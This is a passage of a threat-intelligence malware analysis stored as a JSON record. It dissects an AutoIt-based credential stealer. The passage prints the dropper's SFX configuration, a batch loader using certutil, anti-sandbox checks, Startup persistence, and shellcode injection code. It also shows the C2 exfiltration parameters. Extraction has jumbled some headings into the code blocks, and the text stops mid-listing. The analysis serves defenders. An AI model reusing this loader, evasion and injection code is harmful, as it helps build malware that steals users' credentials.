{
    "id": "77a13ae6-e13a-4da1-acc6-9066c2a69a57",
    "created_at": "2023-01-12T15:10:57.625434Z",
    "updated_at": "2025-03-27T02:05:40.587702Z",
    "deleted_at": null,
    "sha1_hash": "2d15d36c4486ba9cef673ea27bc33748f2d1451a",
    "title": "2020-09-07 - Time to take the bull by the horns",
    "authors": "",
    "file_creation_date": "2022-05-28T19:57:47Z",
    "file_modification_date": "2022-05-28T19:57:47Z",
    "file_size": 1102607,
    "plain_text": "# CyberThreatIntel/Analysis.md at master · StrangerealIntel/CyberThreatIntel · GitHub\n\n**[github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional Analysis/UnknownTA/2020-09-07/Analysis.md](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/UnknownTA/2020-09-07/Analysis.md)**\n\nStrangerealIntel\n\n#### Cannot retrieve contributors at this time\n\n## Time to take the bull by the horns\n\n#### Malware analysis TTPs Hunting Cyber kill chain Indicators Of Compromise (IOC) References MITRE ATT&CK Matrix Links\n Original Tweet References\n\n## Malware-analysis\n\n\n-----\n\n#### The initial vector is a self-execute archive (SFX). This is built from a project of alternate module : 7z sfx Modified Module (7zsfx).\n```\nSFX module - Copyright (c) 2005-2016 Oleg Scherbakov\n1.7.0 develop [x86] build 3900 (April 1, 2016)\n7-Zip archiver - Copyright (c) 1999-2015 Igor Pavlov\n15.14 (December 31, 2015)\n\n This launches a shell instance for extract the objects.\n\n```\n\n-----\n\n#### Like 7zip module, this uses an internal configuration for the actions to execute once the process extraction of the objects is done. This uses the hide methods for run as background and doesn't overwrite the files if already exists.\n\n\n-----\n\n```\n;!@Install@!UTF 8!\n// control flag chains\nMiscFlags=\"1+2+16+64+128\"\n// 2 - hides the extraction dialog completely (silent mode)\nGUIMode=\"2\"\n// 1 - do not overwrite the existing files\nOverwriteMode=\"1\"\n// hidcon: -> hide window to user\nRunProgram=\"hidcon:cmd /c echo SLsZudZK\"\nRunProgram=\"hidcon:cmd /c cmd < sVqHm.com\"\n;!@InstallEnd@!Rar!\n\n#### On the flags of Miscflags, we can see on the Russian archive of the project that can be chains for do a stack process of the actions for automation for the errors and check actions.\n\n This launches the main script for initiating the rest of the chain of actions.\n\n```\n\n-----\n\n#### The first part of the script use a lot of kill switchs already detected in July 2020 on similliar autoit script. aa_TouchMeNot is a reference of a file used on MSE sandbox for analysis threat in the sandbox, that presented in the first time on the blackhat 2018 and firstly used by BitPaymer ransomware.\n\n\n-----\n\n```\nSet YAFtyhpbN Q\nREM Check sandbox MSE\nif exist C:\\aaa_TouchMeNot_.txt exit\nREM Killswitch Computername\nif %computername% == DESKTOP-%YAFtyhpbN%UO5%YAFtyhpbN%U33 exit\nREM DESKTOP-QO5QU33 \nping -n 1 UKL.UVLJR\nif %errorlevel% == 0 exit\nif %computername% == NfZtFbPfH exit\nif %computername% == ELICZ exit\nif %computername% == MAIN exit\n\n#### The final part of the script fix the header of the autoit builder (23e87924005aeef08ab3c9402aa749c0373ed9fa6c1706c13ca1df5ec33f8928), write on the disk, decode from base 64 the autoit payload to execute and launch with the autoit builder.\nREM Fix header on the autoit builder\n<nul set /p =\"MZ\" > SearchIndexer.com\nREM Echo and write the PE\ntype pZFFZxnbbPw.com >> SearchIndexer.com\nREM Remove the last script \ndel pZFFZxnbbPw.com\nREM Decode from base 64 the autoit payload to execute\ncertutil -decode sUs.com h\nREM Execute it\nSearchIndexer.com h\nping 127.0.0.1 -n 30\n\n As obfuscation, the script uses a lot of while - switches loops for redirect the good section of code to push on each function. The first good thing to have in mind is to verify the functions that used in checking the numbers of calls of references in theirs functions. Like forensic and malware analysis is a matter of instinct, this a good idea, only four of twelve functions is used, the rest is junk code of makes high entropy and more harder the analysis. So only a third of more 16000 lines of the script is to deobfuscate, that a better start.\n\n```\n\n-----\n\n```\nIf\n(Ping(NuEIwMq(\"74I89I100I112I77I120I109I110I74I97I97I100I119I46I74I89\n 1000) <> 0) Then Exit\n$qGRwbSPeJ = @AppDataDir &\nNuEIwMq(\"94I101I113I119I117I110I94I101I113I119I117I110I48I101I113I111\n$ArlTLV = @AppDataDir &\nNuEIwMq(\"99I106I118I124I122I115I99I72I93I117I112I127I94I78\",7)\n$RvZgoJpth = @AppDataDir &\nNuEIwMq(\"98I105I117I123I121I114I98I123I88I116I124I77I124I123I72I124I8\n$aCYDDEjBZszBdg = @AppDataDir &\nNuEIwMq(\"101I108I120I126I124I117I101I90I79I111I82I77I127I82I89I125I93\nIf Not FileExists($qGRwbSPeJ) Then\n     If DirGetSize(@AppDataDir &\nNuEIwMq(\"96I103I115I121I119I112\",4)) < 0 Then\nGlobal $JAYmBXZG = 118\nGlobal $hnwsOohw = 96\nWhile (6350-6349)\nSwitch $JAYmBXZG\nCase 115\n$dlffyVxJSrHGTz = SplashOff()\n$102 = 138\nWhile $RxnOkVaHWvSKlBaAlOllMJswgWDFYJifUGyFKAYzXDzShlpomD > $102\n$dlffyVxJSrHGTz &= ClipGet()\nWEnd\n$RhpdnNrMcyxjdGLYXChqJwlUuEKxGMMN = 5535\n$JAYmBXZG = $JAYmBXZG + 1\nCase 116\n$REJvBWHgZYXtFnk = IsAdmin()\n$88 = 86\nWhile $JuQegpUrJuJzHmfPQmuXDEoyDGiGNfwhBktUwSlHKGMxjgHmIigy > $88\n$REJvBWHgZYXtFnk &= Exp(279)\nWEnd\n$cccOYfnhXSNSgZHXFqVVhhZVdaCFvfsfQ = IsDllStruct(136518)\n$JAYmBXZG = $JAYmBXZG + 1\nCase 117\n\n#### Once the switch conditions removed for getting the code, a second obfuscation is used in passing the strings to deobfuscate on NuEIwMq function. The algorithm is based on offset and the each integer value is converted their corresponding ASCII value.\nFunc NuEIwMq($a, $b)\n  $str = ''\n  $tab = StringSplit($a, \"I\", 2)\n  For $i = 0 To UBound($tab) - 1\n    $str &= Chrw($tab[$i] - $b)\n  Next\nReturn $str\nEndFunc\n\n```\n\n-----\n\n#### This is split the string on array and use offset for getting the final string in reading all the array. The following code on autoit can be easily converted in Powershell for decode the strings.\n```\nfunction Decode\n{\n  param (\n    [string]$a, \n    [int]$b\n  )\n  $str = ''\n  $tab= $a.Split(\"I\")\n  for ($i = 0; $i -lt $tab.Count; $i++) { $str += [char][int]\n($tab[$i] - $b) }\n  return $str\n}\n> Decode\n\"94I101I113I119I117I110I94I101I113I119I117I110I48I101I113I111\" 2\n\\cousl\\cousl.com\n\n As first action the script check if this on the sandbox on using well- known method based on the difference between real time and time pass on the sandbox by GetTickCount method.\nOpt(\"TrayIconHide\", 1)\nFunc Antisandbox_by_diff_time($val)\n     $time1 = DllCall (\"kernel32.dll\", \"long\", \"GetTickCount\")\n     $uFQgPxoxA = DllCall(\"kernel32.dll\", \"DWORD\", \"Sleep\",\n\"dword\", $val)\n     $time2 = DllCall (\"kernel32.dll\", \"long\", \"GetTickCount\")\n     $dif_time = $time2[0] - $time1[0]\n     If Not (($dif_time+500)>=$val and ($dif_time-500)<=$val) Then\n     Exit\n     EndIf\nEndFunc\n\n A second wave of anti-analysis measures is performed in reusing the MSE sandbox flag killswitch domain and various names of computernames.\nIf (FileExists(\"C:\\aaa_TouchMeNot.txt\" Or @ComputerName = \"NfZtFbPfH\"\nOr @ComputerName = \"tz\" Or @ComputerName = \"ELICZ\" Or @ComputerName =\n\"MAIN\" Or @ComputerName = \"DESKTOP-QO5QU33\") Then Exit\n\n By hunting, we can note that the autoit payload have sill the same computernames and check the MSE flag but use differents delimiter for the obfuscated method. The structures are the same and are based on useless functions for the previous reasons.\n\n```\n\n-----\n\n#### Date Delimiter Computernames\n\n\n#### 2020- 09-03\n\n 2020- 09-02\n\n 2020- 08-31\n\n 2020- 08-01\n\n 2020- 07-31\n\n 2020- 07-27\n\n 2020- 07-27\n\n 2020- 07-22\n\n 2020- 07-17\n\n 2020- 07-16\n\n 2020- 07-15\n\n 2020- 07-15\n\n 2020- 07-14\n\n 2020- 07-13\n\n 2020- 07-09\n\n\n#### I NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n M NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n . NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n M NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n M NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n e NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n e NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n ± NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n, NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n, NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n e NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n e NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n . NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n, NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n * NfZtFbPfH, tz, ELICZ, MAIN, DESKTOP-QO5QU33\n\n\n#### Check MSE flag ?\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n Yes\n\n\n#### The next following block of code allocates the semaphore, creates the shortcuts, prepares the files and paths and run the final payload in memory in pushing the anti-sandbox measures for protect the to launch it on analysis environment\n\n\n-----\n\n```\n$Jvar = DllCall(DllOpen(\"kernel32.dll\"), \"handle\",\n\"CreateSemaphoreA\", \"ptr\", Null, \"long\", 1, \"long\", 1, \"str\",\n\"JYdpMxmnJaadw\")\n$CodeError = DllCall(\"kernel32.dll\", \"long\", \"GetLastError\")[0]\nIf $CodeError == 183 Then\n$Pfile = FileOpen(@ScriptDir & '\\' & 'QFfIDvIPtTOu.com',16)\n$RData = FileRead($Pfile)\nIf (Ping(\"JYdpMxmnJaadw.JYdpMxmnJaadw\", 1000) <> 0) Then Exit\n$PathDomain = @AppDataDir & \"\\cousl\\cousl.com\"\n$PathAutoitScript = @AppDataDir & \"\\cousl\\AVnixWG\"\n$PathVBSFile = @AppDataDir & \"\\cousl\\uRnvGvuBvJe.vbs\"\n$PathBinaryData = @AppDataDir & \"\\cousl\\QFfIDvIPtTOu.com\"\nIf Not FileExists($PathDomain) Then\n     If DirGetSize(@AppDataDir & \"\\cousl\") < 0 Then\n     DirCreate(@AppDataDir & \"\\cousl\")\n     EndIf\n     FileWrite(FileOpen($PathAutoitScript,2),\nFileRead(@ScriptFullPath))\n     FileDelete(@ScriptFullPath)\n     FileWrite(FileOpen($PathDomain,2),\nFileRead(FileOpen(@AutoItExe,16)))\n     FileWrite(FileOpen($PathBinaryData,2),\nFileRead(FileOpen(\"SHhKFxKRvVQw0eqo\"),16)))\n     FileDelete(\"SHhKFxKRvVQw0eqo\"))\n     FileWrite(FileOpen($PathVBSFile,2), \"pUCkyGzHUI = GetObject(\"\n& ChrW(34) & \"winmgmts:\\\\.\\root\\cimv2:Win32_Process\" & ChrW(34) &\n\").Create(\" & ChrW(34) & $PathDomain & \" \" & $PathAutoitScript &\nChrW(34) & \", \" & ChrW(34) & @AppDataDir & \"\\cousl\" & ChrW(34) & \",\nNull, WuUbkJJqxFQ )\")\n     FileSetAttrib(@AppDataDir & \"\\cousl\", \"+SH\", 1)\n     If Not FileExists(@StartupDir & \"\\cousl.url\") Then\n          FileWrite(FileOpen(@StartupDir & \"\\cousl.url\",34), \"\n[InternetShortcut]\" & @CRLF & \"URL=\" & ChrW(34) & $PathVBSFile &\nChrW(34))\n     Else\n          FileDelete(@StartupDir & \"\\cousl.url\")\n          FileWrite(FileOpen(@StartupDir & \"\\cousl.url\",34), \"\n[InternetShortcut]\" & @CRLF & \"URL=\" & ChrW(34) & $PathVBSFile &\nChrW(34))\n     EndIf\nEndIf\n$time2Num = 0\nAntisandbox_by_diff_time(8391)\nFor $j = 0 To 29984739\n     $time2Num = $time2Num + 1\nNext\nIf Not ($time2Num == 29984740) Then Exit\n$Path_PE = @SystemDir & \"\\\" & \"nslookup.exe\"\nGlobal $Jvar = AllocatePayload(Init_Struct(Binary($RData),\nBinary(\"7914561\")), $ArgCmdline, $Path_PE)\nWinWaitClose(1)\nElse\nRun(@AutoItExe & \" \" & $CmdLineRaw)\nAntisandbox_by_diff_time(500)\n\n```\n\n-----\n\n#### The two next functions are for initiate the process and the structure which content the payload. In function of the OS arch, this push the following header of structure of the process to initiate.\n\n\n-----\n\n```\nFunc Init_Struct($arg1, $arg2)\n     If @AutoItX64 Then\n          Local $OP_DLL_Struct = \"0x89C055 [...] EC54963F241\"\n          $OP_DLL_Struct &= \"83C201EBC448 [...] 5EC3\"\n     Else\n          Local $OP_DLL_Struct = \"0x89C05531C057565383E [...]\n583C4085B5E5F5DC2100089\"\n          $OP_DLL_Struct &= \"DB5557565383EC088B54 [...] 21000\"\n     EndIf\n          Local $Ref_Struct_1 = (StringInStr($OP_DLL_Struct,\n\"89C0\") - 3) / 2\n          Local $Ref_Struct_2 = (StringInStr($OP_DLL_Struct,\n\"89DB\") - 3) / 2\n          $OP_DLL_Struct = Binary($OP_DLL_Struct)\n          $struct1 = DllStructCreate(\"byte[\" &\nBinaryLen($OP_DLL_Struct) & \"]\", DllCall(\"kernel32.dll\", \"ptr\",\n\"VirtualAlloc\", \"ptr\", 0, \"ulong_ptr\", BinaryLen($OP_DLL_Struct),\n\"dword\", 0x00001000, \"dword\", 0x00000040)[0])\n          DllStructSetData($struct1, 1, $OP_DLL_Struct)\n          Local $lim = BinaryLen($arg2)\n          Local $Bytes_Struct = DllStructCreate(\"byte[\" & $lim\n& \"]\")\n          DllStructSetData($Bytes_Struct, 1, $arg2)\n          Local $ctvBJcdIjHzL = DllStructCreate(\"byte[272]\")\n          @AutoItX64 ? DllCallAddress(\"none\",\nDllStructGetPtr($struct1) + $Ref_Struct_1, \"ptr\",\nDllStructGetPtr($ctvBJcdIjHzL), \"ptr\",\nDllStructGetPtr($Bytes_Struct), \"uint\", $lim, \"int\", 0) :\nDllCall(\"user32.dll\", \"uint\", \"CallWindowProc\", \"ptr\",\nDllStructGetPtr($struct1) + $Ref_Struct_1, \"ptr\",\nDllStructGetPtr($ctvBJcdIjHzL), \"ptr\",\nDllStructGetPtr($Bytes_Struct), \"uint\", $lim,\"int\", 0)\n          Local $lim2 = BinaryLen($arg1)\n          Local $Bytes_Struct2 = DllStructCreate(\"byte[\" &\n$lim2 & \"]\")\n          DllStructSetData($Bytes_Struct2, 1, $arg1)\n          @AutoItX64 ? DllCallAddress(\"int\",\nDllStructGetPtr($struct1) + $Ref_Struct_2,\"ptr\",\nDllStructGetPtr($ctvBJcdIjHzL), \"ptr\",\nDllStructGetPtr($Bytes_Struct2), \"uint\", $lim2, \"int\", 0) :\nDllCall(\"user32.dll\", \"uint\", \"CallWindowProc\", \"ptr\",\nDllStructGetPtr($struct1) + $Ref_Struct_2, \"ptr\",\nDllStructGetPtr($ctvBJcdIjHzL), \"ptr\",\nDllStructGetPtr($Bytes_Struct2), \"uint\", $lim2, \"int\", 0)\n          Return Init_process($Bytes_Struct2, 1)\nEndFunc\nFunc Init_process($Ref_Struct, $Ref_Element, $control = 0 )\n     If NOT $control = 0 Then\n     return DllStructGetData($Ref_Struct, $Ref_Element, $control)\n     else\n     return DllStructGetData($Ref_Struct, $Ref_Element)\n     EndIF\nEndFunc\n\n```\n\n-----\n\n#### The last function called is for the allocation of the payload in memory in creating the structure need for run it. The Actor use StringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) as obfuscation for the end of the payload, this chooses a random letter between A to Z but rest the same due to this convert to binary format (01000001 - 01011010) and kept only the first two numbers at left that return each time \"01\". This can be replacing by this value (\"01\") for getting all the shellcode that need to run.\n\n\n-----\n\n```\nFunc AllocatePayload($a, $SJKRKKK , $cOVkTS  )\n     $Payload = \"0xE9971E000 [...] 45F48A00\"\n     [...] \n     $Payload &= \"300400008DB424B001000050F3A5E8F8E2FFFF6A5E596A\"\n& StringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"8BF0586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"8D7C24\"\n     $Payload &= \"3CF3A56689442410586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"6689442412586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"6689442414586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"6689442416\"\n     $Payload &= \"586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"6689442418586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"668944241A586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"668944241C586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"668944241E\"\n     $Payload &= \"586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"6689442420586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"6689442422586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"6689442424586A\" & StringTrimLeft(Binary(Chr(Random(65, 90,\n1))),2) & \"6689442426\"\n     $Payload &= \"6689442428586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"668944242A586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"668944242C586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"668944242E586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2)\n     $Payload &= \"6689442430586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) & \"6689442432586A\" &\nStringTrimLeft(Binary(Chr(Random(65, 90, 1))),2) &\n\"66894424346689442436586689442434\"\n     $Payload &= \"33C066894424368D4 [...] 750C8D84\"\n     $Payload &= \"242C0300008DB424B40 [...] 0000000\"\n     $Payload &=\n\"0000000000000000000000000000000000000000000000000000000000000000\"\n     $Bin_Payload = Binary($Payload)\n     $Bin_Data = Binary($a)\n     $lim_Payload = BinaryLen($Bin_Payload)\n     $initAlloc = DllCall(\"kernel32.dll\", \"ptr\", \"VirtualAlloc\",\n\"ptr\", 0, \"ulong_ptr\", $lim_Payload, \"dword\", 0x00003000, \"dword\",\n0x00000040)[0]\n     $struc = DllStructCreate(\"byte file[\" & BinaryLen($Bin_Data)\n& \"]\")\n     DllStructSetData(DllStructCreate(\"byte nop[\" & $lim_Payload &\n\"]\", $initAlloc), \"nop\", $Bin_Payload)\n     DllStructSetData($struc, \"file\", $Bin_Data)\n     $address = DllCallAddress(\"dword\", $initAlloc, \"str\",\n$cOVkTS, \"ptr\", DllStructGetPtr($struc))[0]\n     Return WinGetProcess($address)\nEndFunc\n\n#### The shellcode extracted can be easily push in Radare2 by a malloc or in Cutter (GUI of Radare2) on the shellcode panel.\n\n```\n\n-----\n\n```\n$ r2 malloc://1\n[0x00000000]> wx\nE9971E0000558BECB84D5A000083EC14663903740433C0EB7F8B433C813C185045000\n [...]\n\n#### As first action, this load the strings on stack strings on the memory. In unstacking the strings, we can get a first look on the actions that perform the shellcode. The attacker uses NtQuerySystemInformation for getting a list of all handles open on the system for perform KnownDlls Cache Poisoning. In comparing the reference with \\KnownDlls\\X, this gets the HandleValue is returned by the call. This allows of to perform an injection on the process to target.\n\n```\n\n-----\n\n```\n0x000001fb   mov word [rbp 0x320], 0x57 ; FindResourceW \n0x00000222   mov byte [rbp - 0x218], al ; 'LoadResource'\n0x0000024f   mov byte [rbp - 0x33e], al ; 'SizeofResource'\n0x00000273   mov byte [rbp - 0x270], al ; 'LockResource'\n0x000002b5   mov byte [rbp - 0x670], al ;\n'NtQuerySystemInformation'\n0x000002ed   mov dword [rbp - 0x658], 0x79726f ;\n'NtAllocateVirtualMem'ory' \n0x00000315   mov word [rbp - 0x2d0], 0x73 ; 'NtOpenProcess'\n0x0000035a   mov word [rbp - 0x6c4], 0x73 ;\n'NtQueryInformationProcess'\n0x00000381   mov word [rbp - 0x2f0], 0x6f ; 'GetSystemInfo'\n0x00000398   mov byte [rbp - 0x2c], al ; 'mbstowcs'\n0x000003a8   mov byte [rbp - 0x22], al ; 'strlen'\n0x000003e6   mov byte [rbp - 0x19e], al ; '\\KnownDlls32\\ntdll.dll'\n0x00000428   mov word [rbp - 0x238], 0x6c ;\n'\\KnownDlls32\\advapi32.dll'\n0x0000046d   mov word [rbp - 0x254], 0x6c ;\n'\\KnownDlls32\\kernel32.dll'\n0x000004a8   mov dword [rbp - 0x1dc], 0x6c6c64 ;\n'\\KnownDlls32\\user32.dll'\n0x000004e4   mov byte [rbp - 0x110], al ; '\\KnownDlls\\ntdll.dll'\n0x0000051c   mov dword [rbp - 0x200], 0x6c6c64 ;\n'\\KnownDlls\\advapi32.dll'\n0x00000558   mov dword [rbp - 0x1c4], 0x6c6c64 ;\n'\\KnownDlls\\kernel32.dll'\n0x00000594   mov word [rbp - fcn.00000164], 0x6c ;\n'\\KnownDlls\\user32.dll'\n0x000005cf   mov byte [rbp - 0xf8], al ; '\\KnownDlls\\Ole32.dll'\n0x000005e9   mov byte [rbp - 0x16], al ; 'user32.dll'\n0x000005ec   mov dword [rbp - 0xf4], 0x704f744e ; 'NtOpenKey' \n0x00000627   mov dword [rbp - 0x410], 0x79654b ; 'NtQueryValueKey'\n0x00000658   mov byte [rbp - 0x39e], al ; 'NtEnumerateKey'\n0x0000066b   mov byte [rbp - 0x76], al ; 'memcpy'\n0x000006a0   mov byte [rbp - 0x5c8], al ; 'CryptAcquireContextW'\n0x000006a6   mov dword [rbp - 0x42c], 0x70797243 ;\n'CryptCreateHash'\n0x000006ce   mov dword [rbp - 0x30c], 0x70797243 ; 'CryptHashData'\n0x0000071c   mov byte [rbp - 0x35e], al ; 'CryptDeriveKey'\n0x00000722   mov dword [rbp - 0x478], 0x70797243\n0x0000074a   mov byte [rbp - 0x468], al ; 'CryptDestroyHash'\n0x00000750   mov dword [rbp - 0x2ac], 0x70797243\n0x0000076e   mov byte [rbp - 0x2a0], al ; 'CryptDecrypt'\n0x00000774   mov dword [rbp - 0x3ec], 0x70797243 ;\n'CryptDestroyKey'\n0x000007c4   mov dword [rbp - 0x56c], 0x747865 ;\n'CryptReleaseContext'\n0x000007f6   mov dword [rbp - 0x558], 0x79726f ;\n'NtReadVirtualMemory'\n0x00000815   mov byte [var_48h], al ; 'LoadLibraryA'\n0x0000083f   mov byte [rbp - 0x96], al ; 'GetProcAddress'\n0x0000085a   mov byte [rbp - 8], al ; 'advapi32.dll'\n0x00000871   mov byte [rbp - 0xc8], al ; 'lstrlenW'\n0x000008b2   mov byte [rbp - 0x626], al ;\n'NtProtectVirtualMemory'\n\n```\n\n-----\n\n```\n0x000008d6   mov byte [rbp 0x228], al ; FreeResource \n0x00000903   mov byte [rbp - 0x36e], al ; 'CreateProcessW'\n0x00000927   mov word [rbp - 0x2e0], 0x79 ; 'RtlZeroMemory'\n0x00000961   mov byte [rbp - 0x4b6], al ; 'NtTerminateProcess'\n0x00000999   mov byte [rbp - 0x5b0], al; 'NtWriteVirtualMemory'\n0x000009d1   mov byte [rbp - 0x598], al ; 'ZwUnmapViewOfSection'\n0x000009fe   mov byte [rbp - 0x37e], al ; 'NtResumeThread'\n0x00000a35   mov byte [rbp - 0x4ca], al ; 'NtSetContextThread'\n0x00000a6c   mov byte [rbp - 0x4f2], al ; 'NtGetContextThread'\n0x00000aa3   mov byte [rbp - 0x48e], al ; 'NtMapViewOfSection'\n0x00000ad1   mov dword [rbp - 0x6c0], 0x61707845 ;\n'NtCreateSection'\n0x00000b0d   mov word [rbp - 0x6a8], 0x57 ;\n'ExpandEnvironmentStringsW'\n0x00000b47   mov byte [rbp - 0x4de], al ; 'GetModuleFileNameA'\n0x00000b88   mov byte [rbp - 0x60e], al ; 'NtQueryInformationFile'\n0x00000bab   mov byte [rbp - 0x156], al ; 'NtReadFile'\n0x00000bce   mov byte [rbp - 0x126], al ; 'NtOpenFile'\n0x00000bf2   mov word [rbp - 0x2c0], 0x79 ; 'NtSetValueKey'\n0x00000c19   mov byte [rbp - 0x290], al ; 'NtCreateFile'\n0x00000c33   mov dword [rbp - 0x1f4], 0x656c69 ; 'NtWriteFile'\n0x00000c79   mov dword [rbp - 0x6fc], 0x687461 ;\n'RtlFormatCurrentUserKeyPath'\n0x00000c90   mov byte [rbp - 0x6e], al ; 'wcscat'\n0x00000ca3   mov byte [rbp - 0x7e], al ; 'memset'\n0x00000cce   mov byte [rbp - 0x440], al ; 'NtDelayExecution'\n0x00000ce7   mov byte [rbp - 0x8e], al ; 'wcslen'\n0x00000d15   mov byte [rbp - 0x454], al ; 'NtCreateThreadEx'\n0x00000d38   mov byte [rbp - 0x17a], al ; 'NtContinue'\n0x00000d66   mov dword [rbp - 0x544], 0x646165 ;\n'RtlCreateUserThread'\n0x00000da1   mov byte [rbp - 0x4a2], al ; 'NtOpenProcessToken'\n0x00000dd9   mov dword [rbp - 0x640], 0x6e656b ;\n'NtAdjustPrivilegesToken'\n0x00000e28   mov byte [rbp - 0x6de], al ;\n'RtlCreateProcessParameters'\n0x00000e60   mov byte [rbp - 0x580], al ; 'RtlCreateUserProcess'\n0x00000e66   mov dword [rbp - 0x52c], 0x7243775a\n0x00000e8e   mov dword [rbp - 0x51c], 0x6e6f69 ;\n'ZwCreateTransaction'\n0x00000eb6   mov word [rbp - 0x310], 0x6e ; 'NtOpenSection'\n0x00000efb   mov byte [rbp - 0x68c], al ;\n'RtlSetCurrentTransaction'\n0x00000f33   mov word [rbp - 0x5e0], 0x6e ;\n'ZwRollbackTransaction'\n0x00000f77   mov byte [rbp - 0x5f6], al ; 'LdrGetProcedureAddress'\n0x00000f9a   mov byte [rbp - 0x14a], al ; 'LdrLoadDll'\n0x00000fb3   mov byte [rbp - 0x86], al ; 'wcscmp'\n0x00000fcd   mov dword [rbp - 0x1b8], 0x41786f ; 'MessageBoxA'\n0x00000ffe   mov byte [rbp - 0x34e], al ; 'IsWow64Process'\n0x0000102c   mov dword [rbp - 0x530], 0x79726f ;\n'NtFreeVirtualMemory'\n0x00001040   mov dword [rbp - 0xa8], 0x65736f ; 'NtClose'\n0x00001057   mov byte [rbp - 0x66], al ; 'wcscpy'\n0x00001082   mov dword [rbp - 0x508], 0x737365 ;\n\n```\n\n-----\n\n```\n NtCreateUserProcess \n0x000010a0   mov byte [rbp - 0xb0], al ; 'wcstombs'\n0x000010cd   mov byte [rbp - 0x32e], al ; 'NtQuerySection'\n0x000010f0   mov byte [rbp - 0x13e], al ; 'ShowWindow'\n0x00001114   mov dword [rbp - 0x430], 0x577845 ; 'CreateWindowExW'\n0x00001145   mov byte [rbp - 0x38e], al ; 'RegisterClassW'\n0x00001172   mov byte [rbp - 0x3ae], al ; 'DefWindowProcW'\n0x00001178   mov dword [rbp - 0x40c], 0x74736f50 ; 'Post'\n0x00001182   mov dword [rbp - 0x408], 0x74697551 ; 'Quit'\n0x00001196   mov dword [rbp - 0x400], 0x656761 ; 'Message'\n0x000011b4   mov byte [rbp - 0xd4], al ; 'EndPaint'\n0x000011ce   mov byte [rbp - 0xbc], al ; 'FillRect'\n0x000011f1   mov byte [rbp - 0x132], al ; 'BeginPaint'\n0x0000121e   mov byte [rbp - 0x3ce], al ; 'CoInitializeEx'\n0x0000124c   mov byte [rbp - 0x47c], al ; 'CoCreateInstance'\n0x000012d7   mov byte [rbp - 0x3be], al ; 'NtCreateMutant'\n0x000012fb   mov byte [rbp - 0x2b0], al ; 'NtOpenMutant'\n0x00001360   mov dword [rbp - 0x284], 0x57786574 ; 'CreateMutexW'\n\n#### By the way, this rebuilds the sections and the dll to inject on the process.\n\n```\n\n-----\n\n-----\n\n-----\n\n#### On dynamic analysis, we can see the actions for streal the credentials in downloading and executing the same sqlite3 package (76ec7536ebeaa661263f677f89222bb5ac68c16087d3e99a66cba6419d34b57f) that has used by some samples since last month. This pushes the data extracted with the sqlite3.dll to the corresponding file and compact it on a zip in memory.\n\n Unfortunately, the C2 don't respond but the agent sends the informations and the role of some parameters can be assigned.\n```\n// first post : \np1=90059c37-1320-41a4-b58d-816d806e6f6e6976&p2=55534552&p3=61646D696E&p4=57696E646F77732037205365727\n ... \n // Second post : \n p1=90059c37-1320-41a4-b58d-816d806e6f6e6976&p2=55534552&p3=61646D696E&p4=57696E646F77732037205365727\n\n```\n\n#### Parameter Description Example from Anyrun\n\n\n#### Example from Anyrun (decoded)\n\n\n-----\n\n#### 90059c37- 1320-41a4- b58d-816d- 806e6f6e6976\n\n\n#### p1 GUID Client\n\n\n#### 90059c37-1320-41a4- b58d-816d- 806e6f6e6976\n\n\n#### p2 Computername 55534552 USER\n\n p3 Username 61646D696E admin\n\n\n#### 57696E646F7773 ... 974696F6E29\n\n 504B0304140000080800 ... / 4F4B / Response command\n\n\n#### Windows 7 Service Pack 1 (Version 6.1, Build 7601, 32-bit Edition)\n\n ZIP DATA / OK / Response command\n\n\n#### p4\n\n p5\n\n p8\n\n\n#### System Information\n\n keep for new feature ?\n\n Response (DATA / OK/ Response command)\n\n\n#### This time the data are only push as hex string to the C2 instead of with an XOR and with a different structure in the response to the C2 that the sample of June 2020.\n\n Like the zip doesn't have a password, this can be easily unzipping for getting the content. Anyrun just have browser honeypot but steal also current credentials (wallets, configurations ...).\n\n\n-----\n\n```\n90059c37 1320 41a4 b58d 816d 806e6f6e6976 // By GUID client\n  |  information.txt // system info\n  |\n  +---cookies 